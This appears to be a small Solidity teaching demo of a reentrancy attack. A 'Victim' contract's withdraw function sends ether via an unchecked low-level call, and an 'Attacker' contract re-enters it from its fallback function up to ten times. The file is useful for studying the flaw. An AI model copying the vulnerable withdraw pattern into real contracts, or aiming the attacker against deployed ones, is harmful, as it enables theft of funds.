pragma solidity ^0.4.8;

contract Victim {
    event Blanance(uint amount);

    function withdraw() {
        uint transferAmt= 11;  // just a little so we can follow flow control 
        Blanance(this.balance);
        if (!msg.sender.call.value(transferAmt)()) throw; 
    }

    // deposit some funds to work with
    function deposit() payable {
        Blanance(this.balance);
    }
}

contract Attacker {

    Victim public v;
    uint public count;

    event LogFallback(uint count, uint balance);

    function Attacker(address victim) {
        v = Victim(victim);
    }

    function attack() {
        v.withdraw();
    }

    function () payable {
        count++;
        LogFallback(count, this.balance);
        // crude stop before we run out of gas
        if(count < 10) v.withdraw();
    }

}
